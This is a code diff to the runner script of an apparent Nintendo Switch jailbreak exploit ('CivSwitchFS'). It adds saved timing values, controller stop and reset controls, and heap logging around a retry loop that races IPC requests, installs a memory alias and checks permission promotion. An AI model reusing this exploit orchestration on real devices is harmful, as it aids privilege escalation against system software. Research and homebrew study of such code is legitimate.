@@ -51,25 +51,39 @@ import {
 } from "./core/log-format.mjs";
 import {
     setVerboseLogging,
+    isVerboseLogging,
     stageOnlyLog,
     emitStage,
     emitVerboseStage
 } from "./core/log-stage.mjs";
-import {clearVisualLog, installVisualLogPatch} from "./core/visuals.mjs";
+import {
+    clearVisualLog,
+    installRunInputControls,
+    installVisualLogPatch
+} from "./core/visuals.mjs";
 
 const {
     allocPage,
     beginAllocationTracking,
     checkWindow,
     closeHandle,
+    cloneObject,
     cmifReply,
     endAllocationTracking,
     extractRoleTimings,
     freeTrackedAllocations,
+    getMountHandle,
     ipcCommitChecked,
+    ipcCreateDirectoryChecked,
+    ipcDeleteFileChecked,
     ipcDeleteDirectoryRecursivelyChecked,
+    ipcGetEntryTypeChecked,
+    ipcReadFileChecked,
+    ipcRenameFileChecked,
+    ipcWriteFileChecked,
     prepPacket,
     read32,
+    readAllocationCounters,
     sendIPC,
     write32,
     writeStr,
@@ -78,9 +92,16 @@ const {
 
 const BASE_ATTEMPTS = 10;
 const MAX_TOTAL_ATTEMPTS = 30;
-const RETRY_PAUSE_MS = 250;
+const RETRY_PAUSE_MS = 100;
 const SCRATCH_DIR = "/hole";
 const NOT_FOUND = 0x202;
+const TIMING_SAVE_DIR = "/civswitchfs";
+const TIMING_SAVE_PATH = TIMING_SAVE_DIR + "/timings.json";
+const TIMING_SAVE_TEMP_PATH = TIMING_SAVE_PATH + ".tmp";
+const TIMING_SAVE_DISPLAY_PATH = "save:" + TIMING_SAVE_PATH;
+const TIMING_SAVE_VERSION = 1;
+const MAX_TIMING_SAVE_BYTES = 1024;
+const MAX_TIMING_DELAY_NS = 10000000;
 
 // ---------------------------------------------------------------------------
 // Entry point (bounded retry loop)
@@ -90,22 +111,98 @@ export async function run() {
     installVisualLogPatch();
     const previousVerboseLogging = setVerboseLogging(VERBOSE_LOGGING);
     const previousLogPolicy = setLogPolicy(stageOnlyLog);
+    const timingPersistence = {
+        checked: false,
+        loaded: false,
+        adjustedThisRun: false,
+        savedThisRun: false,
+        deletedThisRun: false,
+        resetRequested: false,
+        resetPending: false,
+        useDefaultsThisAttempt: false,
+        stopRequested: false,
+        saveError: null,
+        resetLogPromise: Promise.resolve(),
+        stopLogPromise: Promise.resolve(),
+        verbosityLogPromise: Promise.resolve()
+    };
+    const defaultTimingConfig = createFspIdentityConfig();
+    const builtInTimingSchedule = {
+        roleDelays: defaultTimingConfig.roleDelays.slice(),
+        guardDelays: defaultTimingConfig.guardDelays.slice(),
+        baselineRoleDelays: defaultTimingConfig.roleDelays.slice(),
+        baselineGuardDelays: defaultTimingConfig.guardDelays.slice()
+    };
+    let inputControls = null;
 
     try {
+        function queueVerbosityMessage(message) {
+            timingPersistence.verbosityLogPromise =
+                timingPersistence.verbosityLogPromise.then(() => emitStage(message))
+                    .catch(() => {});
+        }
+
+        inputControls = installRunInputControls({
+            onToggleVerbose() {
+                const enabled = !isVerboseLogging();
+                setVerboseLogging(enabled);
+                queueVerbosityMessage(enabled
+                    ? "Verbose logging enabled (controller Y switches to normal)."
+                    : "Normal logging enabled.");
+            },
+            onResetTimings() {
+                timingPersistence.resetRequested = true;
+                timingPersistence.resetPending = true;
+                timingPersistence.resetLogPromise =
+                    timingPersistence.resetLogPromise.then(() => emitStage(
+                        "X pressed: the next attempt, if one runs, will use built-in timings; " +
+                        TIMING_SAVE_DISPLAY_PATH +
+                        " will be deleted when this run ends.")
+                    ).catch(() => {});
+            },
+            onStop() {
+                if (timingPersistence.stopRequested) return;
+                timingPersistence.stopRequested = true;
+                timingPersistence.stopLogPromise = emitStage(
+                    "B/cancel pressed: stop requested. The current wave, if any, will finish; " +
+                    "no further waves or attempts will launch.")
+                    .catch(() => {});
+            }
+        });
+
         let canaryTimingSchedule = null;
         let attemptLimit = BASE_ATTEMPTS;
         let positiveAttemptsTotal = 0;
         let positiveWindowsTotal = 0;
 
+        await emitStage("CivSwitchFS (no RPC) by Nerisma\n" +
+            "Thanks to Slapah (civ port)\n" +
+            "Thanks to Pespipu (original ns2jb)\n" +
+            "Thanks to Kurumuz (ns2jb improvements)");
+        await emitStage(isVerboseLogging()
+            ? "Verbose logging is on (controller Y toggles the mode)."
+            : "Normal logging is on (controller Y enables verbose summaries).");
+        await emitStage("Checking for saved timings...");
         for (let attempt = 1; attempt <= attemptLimit; attempt++) {
-            if (attempt === 1)
-                await emitStage("CivSwitchFS by Nerisma");
+            if (timingPersistence.stopRequested) return;
             await emitStage("======== ATTEMPT " + attempt + " ========");
+            if (timingPersistence.stopRequested) return;
+            if (timingPersistence.resetPending) {
+                canaryTimingSchedule = copyCanaryTimingSchedule(
+                    builtInTimingSchedule);
+                timingPersistence.resetPending = false;
+                timingPersistence.useDefaultsThisAttempt = true;
+            } else {
+                timingPersistence.useDefaultsThisAttempt = false;
+            }
             // The hard-cap attempt verifies the last schedule without retuning.
             const result = await runTrackedAttempt(canaryTimingSchedule,
-                attempt < MAX_TOTAL_ATTEMPTS);
+                attempt < MAX_TOTAL_ATTEMPTS, timingPersistence);
             positiveAttemptsTotal += result.positiveAttempts || 0;
             positiveWindowsTotal += result.positiveWindows || 0;
+
+            if (timingPersistence.stopRequested || result.stoppedByUser)
+                return;
 
             if (result.permissionProven) {
                 if (result.promotionRestored && result.safeToRetry) {
@@ -161,8 +258,42 @@ export async function run() {
         await emitStage("Unexpected error. Checking cleanup status.");
         await emitVerboseStage("Workflow error: " + String(error?.message || error));
     } finally {
-        setLogPolicy(previousLogPolicy);
-        setVerboseLogging(previousVerboseLogging);
+        await waitMs(0);
+        try {
+            await timingPersistence.verbosityLogPromise;
+            if (timingPersistence.stopRequested)
+                await timingPersistence.stopLogPromise;
+            if (timingPersistence.resetRequested) {
+                await timingPersistence.resetLogPromise;
+                await emitStage("Deleting saved timing configuration...");
+                let deleted;
+                try {
+                    deleted = deleteTimingScheduleFromFreshSaveHandle();
+                } catch (error) {
+                    deleted = {ok: false,
+                        error: String(error?.message || error)};
+                }
+                if (deleted.ok) {
+                    timingPersistence.deletedThisRun = true;
+                    await emitStage(deleted.deletedPaths.length
+                        ? "Deleted saved timing configuration from " +
+                            TIMING_SAVE_DISPLAY_PATH + "."
+                        : "No saved timing configuration remained at " +
+                            TIMING_SAVE_DISPLAY_PATH + ".");
+                } else {
+                    await emitStage("Could not delete saved timing configuration from " +
+                        TIMING_SAVE_DISPLAY_PATH + " (" + deleted.error + ").");
+                }
+                if (deleted.cleanupWarning)
+                    await emitVerboseStage("Timing config deletion cleanup: " +
+                        deleted.cleanupWarning);
+            }
+        } finally {
+            inputControls?.clearRunActions?.();
+            inputControls?.dispose?.();
+            setLogPolicy(previousLogPolicy);
+            setVerboseLogging(previousVerboseLogging);
+        }
     }
 }
 
@@ -179,21 +310,32 @@ function copyCanaryTimingSchedule(schedule) {
     };
 }
 
-function formatFinalTimingSchedule(schedule) {
-    if (!schedule || !Array.isArray(schedule.roleDelays) ||
-        schedule.roleDelays.length !== 10 ||
-        !schedule.roleDelays.every(Number.isSafeInteger) ||
-        !Array.isArray(schedule.guardDelays) ||
-        schedule.guardDelays.length !== 2 ||
-        !schedule.guardDelays.every(Number.isSafeInteger)) {
+function formatFinalTimingSchedule(schedule, timingPersistence) {
+    if (!schedule || !isValidTimingValues(
+        schedule.roleDelays, schedule.guardDelays)) {
         return ["Final timing values are unavailable."];
     }
 
-    return [
-        "Successful timings in nanoseconds; copy into src/core/config.mjs:",
-        "var roleDelays = [" + schedule.roleDelays.join(", ") + "];",
-        "var guardDelays = [" + schedule.guardDelays.join(", ") + "];"
-    ];
+    if (timingPersistence?.resetRequested) {
+        return [];
+    }
+
+    if (timingPersistence?.adjustedThisRun &&
+        !timingPersistence.savedThisRun) {
+        return [
+            "Adjusted timings could not be saved to " +
+                TIMING_SAVE_DISPLAY_PATH + "; current values:",
+            "var roleDelays = [" + schedule.roleDelays.join(", ") + "];",
+            "var guardDelays = [" + schedule.guardDelays.join(", ") + "];"
+        ];
+    }
+
+    if (timingPersistence?.savedThisRun || timingPersistence?.loaded) {
+        return ["Adjusted timings have been saved in " +
+            TIMING_SAVE_DISPLAY_PATH + "."];
+    }
+
+    return [];
 }
 
 async function beginCleanupLog(attemptState) {
@@ -202,8 +344,325 @@ async function beginCleanupLog(attemptState) {
     await emitStage("Cleaning up...");
 }
 
+function isValidTimingArray(values, expectedLength) {
+    if (!Array.isArray(values) || values.length !== expectedLength ||
+        !values.every(value => Number.isSafeInteger(value) && value >= 0 &&
+            value <= MAX_TIMING_DELAY_NS)) return false;
+    for (let i = 1; i < values.length; i++)
+        if (values[i] - values[i - 1] < 50000) return false;
+    return true;
+}
+
+function isValidTimingValues(roleDelays, guardDelays) {
+    return isValidTimingArray(roleDelays, 10) &&
+        isValidTimingArray(guardDelays, 2);
+}
+
+function loadTimingScheduleFromSave(handle) {
+    if (!handle) return {status: "unavailable", detail: "save handle unavailable"};
+
+    let result = {status: "unavailable", detail: "timing file unavailable"};
+    try {
+        const entry = ipcGetEntryTypeChecked(handle, TIMING_SAVE_PATH);
+        if (entry.transport !== 0) {
+            result = {status: "unavailable", detail: "entry transport " +
+                timingHex(entry.transport)};
+        } else if (entry.result === NOT_FOUND) {
+            result = {status: "missing"};
+        } else if (entry.result !== 0) {
+            result = {status: "unavailable", detail: "entry result " +
+                timingHex(entry.result)};
+        } else if (entry.type !== 1) {
+            result = {status: "invalid", detail: "timing path is not a file"};
+        } else {
+            const read = ipcReadFileChecked(handle, TIMING_SAVE_PATH,
+                MAX_TIMING_SAVE_BYTES);
+            if (!read.ok) {
+                result = {status: "invalid", detail: "read " + read.stage +
+                    (read.transport !== null && read.transport !== 0
+                        ? " transport " + timingHex(read.transport) : "") +
+                    (read.result !== null && read.result !== 0
+                        ? " result " + timingHex(read.result) : "")};
+            } else {
+                let json = "";
+                for (const byte of read.bytes)
+                    json += String.fromCharCode(byte);
+                const data = JSON.parse(json);
+                if (data?.version !== TIMING_SAVE_VERSION ||
+                    !isValidTimingValues(data.roleDelays, data.guardDelays)) {
+                    result = {status: "invalid",
+                        detail: "unsupported or invalid timing data"};
+                } else {
+                    result = {status: "loaded", schedule: {
+                        roleDelays: data.roleDelays.slice(),
+                        guardDelays: data.guardDelays.slice()
+                    }};
+                }
+            }
+        }
+    } catch (error) {
+        result = {status: "invalid", detail: String(error?.message || error)};
+    }
+    return result;
+}
+
+function persistTimingSchedule(handle, schedule) {
+    if (!handle || !schedule || !isValidTimingValues(
+        schedule.roleDelays, schedule.guardDelays)) {
+        return {ok: false, error: "invalid timing schedule or save handle"};
+    }
+
+    try {
+        const directory = ipcGetEntryTypeChecked(handle, TIMING_SAVE_DIR);
+        if (directory.transport !== 0)
+            throw new Error("directory transport " + timingHex(directory.transport));
+        if (directory.result === NOT_FOUND) {
+            requireTimingFsSuccess("create directory",
+                ipcCreateDirectoryChecked(handle, TIMING_SAVE_DIR));
+        } else if (directory.result !== 0) {
+            throw new Error("directory result " + timingHex(directory.result));
+        } else if (directory.type !== 0) {
+            throw new Error("timing directory path is not a directory");
+        }
+
+        const tempEntry = ipcGetEntryTypeChecked(handle, TIMING_SAVE_TEMP_PATH);
+        if (tempEntry.transport !== 0)
+            throw new Error("temporary entry transport " + timingHex(tempEntry.transport));
+        if (tempEntry.result === 0) {
+            if (tempEntry.type !== 1)
+                throw new Error("temporary timing path is not a file");
+            requireTimingFsSuccess("remove stale temporary file",
+                ipcDeleteFileChecked(handle, TIMING_SAVE_TEMP_PATH));
+        } else if (tempEntry.result !== NOT_FOUND) {
+            throw new Error("temporary entry result " + timingHex(tempEntry.result));
+        }
+
+        const serialized = JSON.stringify({version: TIMING_SAVE_VERSION,
+            roleDelays: schedule.roleDelays,
+            guardDelays: schedule.guardDelays});
+        const bytes = [];
+        for (let i = 0; i < serialized.length; i++)
+            bytes.push(serialized.charCodeAt(i));
+        const written = ipcWriteFileChecked(handle, TIMING_SAVE_TEMP_PATH, bytes);
+        if (!written.ok)
+            throw new Error("write temporary file " + written.stage +
+                (written.transport !== null && written.transport !== 0
+                    ? " transport " + timingHex(written.transport) : "") +
+                (written.result !== null && written.result !== 0
+                    ? " result " + timingHex(written.result) : ""));
+
+        const staged = ipcReadFileChecked(handle, TIMING_SAVE_TEMP_PATH,
+            MAX_TIMING_SAVE_BYTES);
+        if (!staged.ok)
+            throw new Error("temporary file readback " + staged.stage +
+                (staged.transport !== null && staged.transport !== 0
+                    ? " transport " + timingHex(staged.transport) : "") +
+                (staged.result !== null && staged.result !== 0
+                    ? " result " + timingHex(staged.result) : ""));
+        const stagedMismatch = timingBytesMismatch(bytes, staged.bytes);
+        if (stagedMismatch)
+            throw new Error("temporary file readback mismatch: " + stagedMismatch);
+
+        const targetEntry = ipcGetEntryTypeChecked(handle, TIMING_SAVE_PATH);
+        if (targetEntry.transport !== 0)
+            throw new Error("target entry transport " + timingHex(targetEntry.transport));
+        if (targetEntry.result === 0) {
+            if (targetEntry.type !== 1)
+                throw new Error("timing save path is not a file");
+            requireTimingFsSuccess("remove old timing file",
+                ipcDeleteFileChecked(handle, TIMING_SAVE_PATH));
+        } else if (targetEntry.result !== NOT_FOUND) {
+            throw new Error("target entry result " + timingHex(targetEntry.result));
+        }
+
+        requireTimingFsSuccess("publish timing file",
+            ipcRenameFileChecked(handle, TIMING_SAVE_TEMP_PATH,
+                TIMING_SAVE_PATH));
+        requireTimingFsSuccess("commit timing file", ipcCommitChecked(handle));
+
+        const saved = ipcReadFileChecked(handle, TIMING_SAVE_PATH,
+            MAX_TIMING_SAVE_BYTES);
+        if (!saved.ok)
+            throw new Error("saved timing file readback " + saved.stage +
+                (saved.transport !== null && saved.transport !== 0
+                    ? " transport " + timingHex(saved.transport) : "") +
+                (saved.result !== null && saved.result !== 0
+                    ? " result " + timingHex(saved.result) : ""));
+        const savedMismatch = timingBytesMismatch(bytes, saved.bytes);
+        if (savedMismatch)
+            throw new Error("saved timing file readback mismatch: " + savedMismatch);
+        return {ok: true};
+    } catch (error) {
+        return {ok: false, error: String(error?.message || error)};
+    }
+}
+
+function persistTimingScheduleFromFreshSaveHandle(schedule) {
+    const tracker = beginAllocationTracking();
+    if (!tracker)
+        return {ok: false, error: "could not start save allocation tracking"};
+
+    let handle = 0;
+    let result = {ok: false, error: "save mount unavailable"};
+    let cleanupWarning = null;
+    try {
+        const mount = getMountHandle("save");
+        if (!mount) throw new Error("save mount unavailable");
+        handle = cloneObject(mount.handle, mount.objId);
+        if (!handle) throw new Error("could not clone save mount");
+        result = persistTimingSchedule(handle, schedule);
+    } catch (error) {
+        result = {ok: false, error: String(error?.message || error)};
+    } finally {
+        if (handle) {
+            try {
+                const closeResult = Number(closeHandle(handle)) >>> 0;
+                if (closeResult !== 0)
+                    cleanupWarning = "save handle close " + timingHex(closeResult);
+            } catch (error) {
+                cleanupWarning = "save handle close threw: " +
+                    String(error?.message || error);
+            }
+        }
+
+        if (!endAllocationTracking(tracker)) {
+            cleanupWarning = (cleanupWarning ? cleanupWarning + "; " : "") +
+                "save allocation tracking did not end cleanly";
+        } else {
+            const freed = freeTrackedAllocations(tracker);
+            if (!freed.ok)
+                cleanupWarning = (cleanupWarning ? cleanupWarning + "; " : "") +
+                    "save buffer cleanup failed";
+        }
+    }
+
+    if (cleanupWarning) result.cleanupWarning = cleanupWarning;
+    return result;
+}
+
+function deleteTimingSchedule(handle) {
+    if (!handle) return {ok: false, error: "save handle unavailable"};
+
+    const deletedPaths = [];
+    const errors = [];
+    for (const path of [TIMING_SAVE_PATH, TIMING_SAVE_TEMP_PATH]) {
+        try {
+            const entry = ipcGetEntryTypeChecked(handle, path);
+            if (entry.transport !== 0)
+                throw new Error("entry transport " + timingHex(entry.transport));
+            if (entry.result === NOT_FOUND) continue;
+            if (entry.result !== 0)
+                throw new Error("entry result " + timingHex(entry.result));
+            if (entry.type !== 1)
+                throw new Error("timing path is not a file: " + path);
+
+            requireTimingFsSuccess("delete " + path,
+                ipcDeleteFileChecked(handle, path));
+            deletedPaths.push(path);
+        } catch (error) {
+            errors.push(path + ": " + String(error?.message || error));
+        }
+    }
+
+    if (deletedPaths.length) {
+        try {
+            requireTimingFsSuccess("commit timing config deletion",
+                ipcCommitChecked(handle));
+        } catch (error) {
+            errors.push(String(error?.message || error));
+        }
+        for (const path of deletedPaths) {
+            try {
+                const entry = ipcGetEntryTypeChecked(handle, path);
+                if (entry.transport !== 0)
+                    throw new Error("verify deletion transport " +
+                        timingHex(entry.transport));
+                if (entry.result !== NOT_FOUND)
+                    throw new Error("verify deletion result " +
+                        timingHex(entry.result));
+            } catch (error) {
+                errors.push("verify " + path + ": " +
+                    String(error?.message || error));
+            }
+        }
+    }
+
+    return errors.length
+        ? {ok: false, error: errors.join("; "), deletedPaths}
+        : {ok: true, deletedPaths};
+}
+
+function deleteTimingScheduleFromFreshSaveHandle() {
+    const tracker = beginAllocationTracking();
+    if (!tracker)
+        return {ok: false, error: "could not start save allocation tracking"};
+
+    let handle = 0;
+    let result = {ok: false, error: "save mount unavailable"};
+    let cleanupWarning = null;
+    try {
+        const mount = getMountHandle("save");
+        if (!mount) throw new Error("save mount unavailable");
+        handle = cloneObject(mount.handle, mount.objId);
+        if (!handle) throw new Error("could not clone save mount");
+        result = deleteTimingSchedule(handle);
+    } catch (error) {
+        result = {ok: false, error: String(error?.message || error)};
+    } finally {
+        if (handle) {
+            try {
+                const closeResult = Number(closeHandle(handle)) >>> 0;
+                if (closeResult !== 0)
+                    cleanupWarning = "save handle close " + timingHex(closeResult);
+            } catch (error) {
+                cleanupWarning = "save handle close threw: " +
+                    String(error?.message || error);
+            }
+        }
+
+        if (!endAllocationTracking(tracker)) {
+            cleanupWarning = (cleanupWarning ? cleanupWarning + "; " : "") +
+                "save allocation tracking did not end cleanly";
+        } else {
+            const freed = freeTrackedAllocations(tracker);
+            if (!freed.ok)
+                cleanupWarning = (cleanupWarning ? cleanupWarning + "; " : "") +
+                    "save buffer cleanup failed";
+        }
+    }
+
+    if (cleanupWarning) result.cleanupWarning = cleanupWarning;
+    return result;
+}
+
+function requireTimingFsSuccess(operation, reply) {
+    if (reply.transport !== 0)
+        throw new Error(operation + " transport " + timingHex(reply.transport));
+    if (reply.result !== 0)
+        throw new Error(operation + " result " + timingHex(reply.result));
+}
+
+function timingBytesMismatch(expected, actual) {
+    if (!actual) return "no bytes returned";
+    if (expected.length !== actual.length)
+        return "length expected " + expected.length + ", got " + actual.length;
+    for (let i = 0; i < expected.length; i++) {
+        if (expected[i] !== actual[i])
+            return "byte " + i + " expected " + timingByteHex(expected[i]) +
+                ", got " + timingByteHex(actual[i]);
+    }
+    return null;
+}
+
+function timingByteHex(value) {
+    return "0x" + (Number(value) & 0xFF).toString(16).padStart(2, "0");
+}
+
+function timingHex(value) {
+    return "0x" + (Number(value) >>> 0).toString(16).padStart(8, "0");
+}
+
 function reportAddressProgress(message) {
-    if (VERBOSE_LOGGING) return emitVerboseStage(message);
     if (typeof message !== "string") return Promise.resolve();
 
     const concisePrefix = "ADDRESS_SCAN:";
@@ -220,9 +679,10 @@ function reportAddressProgress(message) {
 // ---------------------------------------------------------------------------
 
 async function runTrackedAttempt(canaryTimingSchedule,
-    allowTimingAdjustments = true) {
+    allowTimingAdjustments = true, timingPersistence = null) {
     const attemptState = {
         permissionProven: false,
+        stoppedByUser: false,
         pidPromotionVerified: false,
         canaryTimingSchedule: copyCanaryTimingSchedule(canaryTimingSchedule),
         positiveAttempts: 0,
@@ -262,7 +722,8 @@ async function runTrackedAttempt(canaryTimingSchedule,
     let executionError = null;
 
     try {
-        await runPayload(attemptState, allowTimingAdjustments);
+        await runPayload(attemptState, allowTimingAdjustments,
+            timingPersistence);
     } catch (error) {
         const errorName = error?.name && error.name !== "Error"
             ? error.name + ": " : "";
@@ -342,10 +803,32 @@ async function runTrackedAttempt(canaryTimingSchedule,
         attemptState.holeCleanupVerified &&
         trackingEnded);
     if (completedWithCleanSession) {
-        await clearVisualLog();
+        if (!timingPersistence?.resetRequested)
+            await clearVisualLog();
         await emitStage("You just Civ Sevened your machine, congrats");
+        if (timingPersistence?.adjustedThisRun &&
+            !timingPersistence.resetRequested &&
+            !timingPersistence.savedThisRun) {
+            await emitStage("Saving adjusted timings...");
+            const saved = persistTimingScheduleFromFreshSaveHandle(
+                attemptState.canaryTimingSchedule);
+            if (saved.ok) {
+                timingPersistence.savedThisRun = true;
+                timingPersistence.saveError = null;
+                if (saved.cleanupWarning)
+                    await emitVerboseStage("Timing save cleanup: " +
+                        saved.cleanupWarning);
+            } else {
+                timingPersistence.saveError = saved.error;
+                await emitStage("Could not save adjusted timings (" +
+                    saved.error + "); keeping them for this run.");
+                if (saved.cleanupWarning)
+                    await emitVerboseStage("Timing save cleanup: " +
+                        saved.cleanupWarning);
+            }
+        }
         for (const line of formatFinalTimingSchedule(
-            attemptState.canaryTimingSchedule)) {
+            attemptState.canaryTimingSchedule, timingPersistence)) {
             await emitStage(line);
         }
     }
@@ -358,7 +841,8 @@ async function runTrackedAttempt(canaryTimingSchedule,
 // Main payload (single attempt)
 // ---------------------------------------------------------------------------
 
-async function runPayload(attemptState, allowTimingAdjustments = true) {
+async function runPayload(attemptState, allowTimingAdjustments = true,
+    timingPersistence = null) {
     const config = createFspIdentityConfig();
     const timingBaseline = {
         roleDelays: config.roleDelays.slice(),
@@ -366,7 +850,7 @@ async function runPayload(attemptState, allowTimingAdjustments = true) {
     };
     const carriedSchedule = copyCanaryTimingSchedule(
         attemptState.canaryTimingSchedule);
-    if (carriedSchedule &&
+    if (!timingPersistence?.useDefaultsThisAttempt && carriedSchedule &&
         carriedSchedule.roleDelays.length === config.roleDelays.length &&
         carriedSchedule.guardDelays.length === config.guardDelays.length &&
         carriedSchedule.baselineRoleDelays.length === config.roleDelays.length &&
@@ -418,7 +902,54 @@ async function runPayload(attemptState, allowTimingAdjustments = true) {
         helpers.cleanup(handles);
         return;
     }
+
+    if (timingPersistence && !timingPersistence.checked) {
+        timingPersistence.checked = true;
+        if (timingPersistence.useDefaultsThisAttempt) {
+            const defaults = createFspIdentityConfig();
+            config.roleDelays.splice(0, config.roleDelays.length,
+                ...defaults.roleDelays);
+            config.guardDelays.splice(0, config.guardDelays.length,
+                ...defaults.guardDelays);
+            timingBaseline.roleDelays = defaults.roleDelays.slice();
+            timingBaseline.guardDelays = defaults.guardDelays.slice();
+            attemptState.canaryTimingSchedule = {
+                roleDelays: defaults.roleDelays.slice(),
+                guardDelays: defaults.guardDelays.slice(),
+                baselineRoleDelays: defaults.roleDelays.slice(),
+                baselineGuardDelays: defaults.guardDelays.slice()
+            };
+            await emitStage("X reset requested before timing load; using built-in timings.");
+        } else {
+            const timingLoad = loadTimingScheduleFromSave(handles.savedHandle);
+            if (timingLoad.status === "loaded") {
+                config.roleDelays.splice(0, config.roleDelays.length,
+                    ...timingLoad.schedule.roleDelays);
+                config.guardDelays.splice(0, config.guardDelays.length,
+                    ...timingLoad.schedule.guardDelays);
+                attemptState.canaryTimingSchedule = {
+                    roleDelays: timingLoad.schedule.roleDelays.slice(),
+                    guardDelays: timingLoad.schedule.guardDelays.slice(),
+                    baselineRoleDelays: timingBaseline.roleDelays.slice(),
+                    baselineGuardDelays: timingBaseline.guardDelays.slice()
+                };
+                timingPersistence.loaded = true;
+                await emitStage("Loaded saved timings from " +
+                    TIMING_SAVE_DISPLAY_PATH + ".");
+            } else if (timingLoad.status === "missing") {
+                await emitStage("No saved timing file found; using built-in timings.");
+            } else {
+                await emitStage("Could not load saved timings; using built-in timings.");
+                if (timingLoad.detail)
+                    await emitVerboseStage("Timing load: " + timingLoad.detail);
+            }
+        }
+    }
+
     const {pktBuf} = sessionSetup;
+    var heapBaseline = readAllocationCounters(handles.rootSession, pktBuf);
+    await emitStage("Heap baseline: counter5=0x" +
+        (heapBaseline ? heapBaseline[5].toString(16) : "unavailable"));
 
     const scratch = await createScratchTree({
         config, helpers,
@@ -441,11 +972,11 @@ async function runPayload(attemptState, allowTimingAdjustments = true) {
     const stopAndCleanup = async options => {
         cleanupAttempted = true;
         await beginCleanupLog(attemptState);
-        await emitVerboseStage("Stopping reason: " + options.reason);
         // Cleanup may itself launch cache-retirement waves. If that throws,
         // keep the allocation scope alive because a worker may still use it.
         attemptState.workersQuiesced = false;
         const cleanupOptions = {...options,
+            dirtyFileSize: config.DIRTY_FILE_SIZE,
             candidateCacheNeedsRetirement: Boolean(
                 options.candidateCacheNeedsRetirement ||
                 attemptState.candidateCacheRetirementRequired)};
@@ -502,6 +1033,16 @@ async function runPayload(attemptState, allowTimingAdjustments = true) {
         await emitStage("Could not prepare worker buffers.");
         return;
     }
+    const renamePathBuffers = {
+        fillerSource: {address: buffers.fillerBuf0, size: 16,
+            expected: buffers.fillerSrc},
+        fillerDestination: {address: buffers.fillerBuf1, size: 0x7F0,
+            expected: buffers.fillerDst},
+        guardSource: {address: buffers.guardBuf0, size: 0x301,
+            expected: buffers.guardPath},
+        guardDestination: {address: buffers.guardBuf1, size: 0x301,
+            expected: buffers.guardPathC}
+    };
 
     const packets = buildIpcRequests({
         config,
@@ -594,19 +1135,29 @@ async function runPayload(attemptState, allowTimingAdjustments = true) {
         selectedDir: scratch.selectedDir,
         setupPath: scratch.setupPath, setupPkt: scratch.setupPkt,
         triggerBuf: buffers.triggerBuf,
+        renamePathBuffers,
         timingBaseline,
-        allowTimingAdjustments
+        allowTimingAdjustments,
+        shouldStop: () => timingPersistence?.stopRequested === true
     });
 
     cleanupWorkerStateSafe = control?.workerStateSafe === true;
+    attemptState.stoppedByUser = control?.stoppedByUser === true;
     attemptState.positiveAttempts = control?.positiveAttempts || 0;
     attemptState.positiveWindows = control?.positiveWindows || 0;
     attemptState.timingAdjustments = control?.timingAdjustments || [];
     attemptState.canaryTimingSchedule = copyCanaryTimingSchedule(
         control?.timingSchedule) || attemptState.canaryTimingSchedule;
     const hasTimingAdjustment = Boolean(control?.timingAdjustments?.length);
+    if (hasTimingAdjustment && timingPersistence) {
+        timingPersistence.adjustedThisRun = true;
+        timingPersistence.savedThisRun = false;
+        timingPersistence.saveError = null;
+    }
     let canaryStageMessage;
-    if (control?.canaryQualified) {
+    if (control?.stoppedByUser) {
+        canaryStageMessage = "Stopped by user after the current wave; no further waves will launch.";
+    } else if (control?.canaryQualified) {
         canaryStageMessage = "CANARY FLIPPED";
     } else if (control?.positiveWindows) {
         canaryStageMessage = "Canary did not flip.";
@@ -625,6 +1176,15 @@ async function runPayload(attemptState, allowTimingAdjustments = true) {
     await emitStage(canaryStageMessage);
     await emitVerboseStage(formatCanaryResult(control, config));
     handles = {...handles, pinHandle: control?.pinHandle || handles.pinHandle};
+
+    if (control?.stoppedByUser) {
+        await stopAndCleanup({
+            reason: "Stopped by user after the current wave; skipping later phases.",
+            scratch, handles, helpers,
+            workerStateSafe: control?.workerStateSafe === true
+        });
+        return;
+    }
 
     if (!control?.ok) {
         await stopAndCleanup({
@@ -685,6 +1245,18 @@ async function runPayload(attemptState, allowTimingAdjustments = true) {
 
     // -- Phase 6: cache alias -------------------------------------------
 
+    var aliasHeapCounters = readAllocationCounters(handles.rootSession, pktBuf);
+    var aliasHeapCounter5 = aliasHeapCounters ? aliasHeapCounters[5] : null;
+    var aliasHeapDelta = aliasHeapCounter5 !== null && heapBaseline
+        ? aliasHeapCounter5 - heapBaseline[5] : null;
+    await emitStage("Heap before memory alias: counter5=" +
+        (aliasHeapCounter5 !== null
+            ? "0x" + aliasHeapCounter5.toString(16) : "unavailable") +
+        "; delta-vs-attempt-start=" +
+        (aliasHeapDelta === null ? "unavailable" :
+            (aliasHeapDelta < 0 ? "-0x" + (-aliasHeapDelta).toString(16)
+                : "+0x" + aliasHeapDelta.toString(16))));
+
     await emitStage("Installing the memory alias...");
     const aliasStartedAt = Date.now();
     cleanupWorkerStateSafe = false;
@@ -722,7 +1294,9 @@ async function runPayload(attemptState, allowTimingAdjustments = true) {
         preSendIndex: waveInfrastructure.preSendIndex,
         setupPath: scratch.setupPath, setupPkt: scratch.setupPkt,
         triggerBuf: buffers.triggerBuf,
-        reportProgress: emitStage
+        renamePathBuffers,
+        reportProgress: emitStage,
+        shouldStop: () => timingPersistence?.stopRequested === true
     });
 
     cleanupWorkerStateSafe = alias?.workerStateSafe === true;
@@ -779,6 +1353,19 @@ async function runPayload(attemptState, allowTimingAdjustments = true) {
         triggerBuf: buffers.triggerBuf,
         analysis: analysisResources
     };
+
+    if (alias?.stoppedByUser || timingPersistence?.stopRequested) {
+        attemptState.stoppedByUser = true;
+        await stopAndCleanup({
+            reason: "Stopped by user during memory alias after the current wave; " +
+                "remaining copy steps were skipped.",
+            scratch, handles, helpers, addressCopy,
+            candidateCacheNeedsRetirement:
+                Boolean(alias?.candidateCacheNeedsRetirement),
+            workerStateSafe: alias?.workerStateSafe === true
+        });
+        return;
+    }
 
     if (!alias?.ok || !alias.aliasInstalled) {
         await stopAndCleanup({
@@ -841,7 +1428,8 @@ async function runPayload(attemptState, allowTimingAdjustments = true) {
     let baseline = null;
     let release = {
         ok: true, extraStorages: releaseSetup.extraStorages,
-        pointerCandidates: [], releaseRounds: 0, totalChangedLinks: 0,
+        pointerCandidates: [], releaseRounds: 0, monitoringRounds: 0,
+        totalChangedLinks: 0,
         stopReason: releaseSetup.eligible ? "baseline-not-run" : "scan-ineligible"
     };
 
@@ -880,11 +1468,16 @@ async function runPayload(attemptState, allowTimingAdjustments = true) {
             await emitStage("Memory candidates found.");
             await emitVerboseStage(release.pointerCandidates.length +
                 " candidates found across " + release.releaseRounds +
-                " rounds (changed links=" + release.totalChangedLinks +").");
+                " rounds" + (release.monitoringRounds
+                    ? " + " + release.monitoringRounds + " monitor" : "") +
+                " (changed links=" + release.totalChangedLinks +").");
         } else {
